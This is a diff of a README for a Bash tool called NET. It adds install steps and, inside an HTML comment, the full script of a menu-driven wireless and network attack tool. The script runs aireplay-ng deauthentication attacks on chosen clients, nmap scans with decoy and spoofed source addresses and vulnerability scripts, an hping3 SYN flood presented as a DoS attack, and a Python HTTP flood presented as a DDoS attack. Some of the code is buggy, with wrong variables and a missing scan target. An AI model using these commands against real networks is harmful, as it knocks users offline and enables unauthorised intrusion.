@@ -1,7 +1,261 @@
 <!-- Badges -->
 ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) <!-- Kali bagdge--> ![Kali](https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white) <!-- Linux bagdge-->![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
 
+![](https://user-images.githubusercontent.com/61265099/78818286-19743180-79dd-11ea-84c5-f629f891dd4b.png)
 <!-- Begin the file -->
 
 # **NET**
-##
+
+![](https://user-images.githubusercontent.com/61265099/78818286-19743180-79dd-11ea-84c5-f629f891dd4b.png)
+
+### NET is a tool that automates various options for network scanning and attacking, specifically for wireless networks
+
+![NET-Tool](./images/NET_tool_image.jpg "NET tool Menu ")
+
+### You can also type " c " to clear the terminal
+
+
+![](https://user-images.githubusercontent.com/61265099/78818286-19743180-79dd-11ea-84c5-f629f891dd4b.png)
+
+# **installation**
+```terminal
+
+git clone https://github.com/Mooshaah/net-tool.git
+
+cd net-tool
+chmod u+x net
+./net
+```
+### hint : you need to cd into the program directory and type " ./net " every time you want to run the program
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- #!/bin/bash
+
+Scanner_menu(){
+echo -e "\e[36m=====================================================
+     A          EEEEEEE   H       H
+    A A         E         H       H
+   A   A        E         H       H
+  AAAAAAA       EEEEE     HHHHHHHHH
+ A       A      E         H       H
+A         A     EEEEEEE   H       H
+    
+=====================================================
+1) Check for a Wirless network card
+2) Set your wirless network card to \e[33mMoniter Mode\e[36m
+3) scan for available routers
+4) Launch a De-Auth Attack
+5) scan for IP addresses & open ports using \e[35mNMAP\e[36m
+6) Launch a \e[31mDOS\e[36m attack
+7) Launch a \e[31mDDOS\e[36m attack
+8) Launch \e[33mWifi\e[36m\e[32mte\e[36m attack
+9) quit
+=====================================================\e[0m"
+}
+
+NMAP(){
+echo -e "\e[35m=====================================================
+	 //\\      // ||\\  //||    //\\    ||===\\
+	//  \\    //  || \\// ||   //  \\   ||   ||
+ ===== //    \\  //   ||     ||  //====\\  ||===// =====
+      //      \\//    ||     || //      \\ ||
+=====================================================
+1) Host scan 
+2) Preform an OS scan
+3) Scan for MAC & IP addersses
+4) Port scan
+5) Decoy scan
+6) Scan for vulnerabilities
+7) Scan using spoofed ip address
+8) Return to main menu
+=====================================================\e[0m"
+}
+
+port(){
+echo -e "\e[35m====================Port Menu========================
+1) Scan a specific port
+2) Scan for all ports
+3) Scan a range of ports
+4) Return main menu
+=====================================================
+\e[0m"
+}
+
+Scanner_menu
+
+# wifi_interface=$(iwconfig 2>/dev/null | grep '^\w' | cut -d ' ' -f 1)
+
+while true; do
+read -p "Choose an option or type 9 to quit!: " SCANNER_OPTION
+case $SCANNER_OPTION in
+	[1])
+		
+		if [ -z "$wifi_interface" ]; then
+    			echo "No wireless interface found."
+			Scanner_menu # Displays the menu after every option entered by the user
+		else
+			iwconfig 2>/dev/null | awk '!/^(lo|eth0)/'
+		fi
+		;;
+	[2])
+		airmon-ng start $wifi_interface  
+		Scanner_menu
+		echo -e  "\e[31mNOTTE YOU HAVE TO RESTART THE PROGRAM AFTER THIS PROCESS !\e[0m"
+
+		;;
+	[3])
+		airodump-ng $wifi_interface
+		Scanner_menu
+		;;
+	[4])
+		read -p "Enter the number of Deauth Packets: " DEAUTH
+		read -p "Enter the target network MAC/BSSID: " ROUTER_MAC
+		read -p "Enter the target client MAC/STATION: " CLIENT_MAC
+
+		if [ -z "$DEAUTH" ]
+		then
+			 echo "The number of De-auth packet to send is empty, pleae insert any number for the packets to be sent !."
+
+		 else
+
+			if [ -z "$ROUTER_MAC" ]
+			then
+				echo "Router MAC/BSSID is empty please insert the BSSID of the target router ! "
+			else
+				if [ -z "$CLIENT_MAC" ]
+				then
+		
+					echo "Client MAC is empty !, please enter the MAC/STATION of the client you want to attack !"
+				else
+		
+					echo " Please enter a target MAC/STATION ! " | read -p $CLIENT_MAC
+					aireplay-ng --deauth $DEAUTH -a $ROUTER_MAC -c $CLIENT_MAC $wifi_interface
+					Scanner_menu
+		fi
+			fi
+		fi
+			;;
+
+		[5])
+			#Printing the nmap menu
+			NMAP
+			#Taking user input
+			while true; do
+			read -p "Enter an option of the menu above: " NMAP_OPTION
+			case $NMAP_OPTION in
+			   [1])
+		           	   read -p "Enter the ip adderss: " IP
+				   nmap $ip
+				   ;;
+			   [2])
+				   read -p "Enter the ip adderss:" OS_IP
+				   nmap $OS_IP
+				   ;;
+			   [3])
+				   read -p "Enter the range of ips to be scanned: " IP_RANGE
+				   nmap -sn $IP_RANGE
+				   ;;
+			   [4])
+
+			   while true; do
+				   port
+				   read -p "choose an option from 1-4: " PORT_MENU
+				   if [ $PORT_MENU -eq 1 ]
+				   then
+					   read -p "Enter the port you want to scan: " PORT
+					   read -p "Enter the target IP: " TAR_IP
+					   nmap -p $PORT $TAR_IP
+				   elif [ $PORT_MENU -eq 2 ]
+				   then
+					   read -p "Enter the Target IP: " TARGET_IP
+					   nmap -p- $TARGET_IP
+				   elif [ $PORT_MENU -eq 3 ]
+				   then
+					   echo "EX: from 1-100"
+					   read -p "Enter the range of ports you want to scan: " RANGE
+					   read -p "Enter the target IP: " target_ip
+				           nmap -p $RANGE $target_ip
+				   elif [ $PORT_MENU -eq 4 ]
+				   then
+				  	NMAP
+					break
+				   fi
+			   done
+				   ;;
+			   [5])
+				   read -p "Enter the first fake IP: " DECOY1
+				   read -p "Enter the second fake IP: " DECOY2
+				   read -p "Enter the third fake IP: " DECOY3
+				   nmap -sS -Pn  -D $DECOY1 $DECOY2 $DECOY3
+				   ;;
+
+			   [6])
+				   read -p "Enter the targer IP: " ip
+				   nmap -sV --script vuln $ip
+				   ;;
+			   [7])
+				   read -p "Enter the spoofed ip: " SPOOFED_IP
+				   read -p "Enter the target ip: " P
+				   nmap -sS -S $SPOOFED_IP $P
+				   ;;
+			   [c])
+				   clear
+				   NMAP
+				   ;;
+			   [8])
+				   Scanner_menu
+				   break
+
+		   esac
+	   done
+		   ;;
+	   [6])
+		   #DOS
+		   read -p "Enter the port of you're targeting: " DOS_PORT
+		   read -p "Enter the IP of the network you're targeting: " DOS_IP
+		   hping3 -i u1 -S -p $DOS_PORT  $DOS_IP
+		   ;;
+	   [7])
+		   #DDOS
+		   read -p "Enter the ip address of the target network to flood: " DDOS_IP
+		   python2 saphyra.py http://$DDOS_IP
+		   ;;
+	   [8])
+		   #Wifite
+
+			if which wifite >/dev/null; then
+				cd ~/MTIMf
+				python2 ./mitmf
+			else
+				apt install wifite
+			fi
+		   
+		   ;;
+
+	[9]| [quit])
+		exit
+		;;
+	[c])
+		clear
+		Scanner_menu
+		;;
+	*)
+		echo "Please choose an option from 1 - 5: "
+		;;
+esac
+done
+ -->
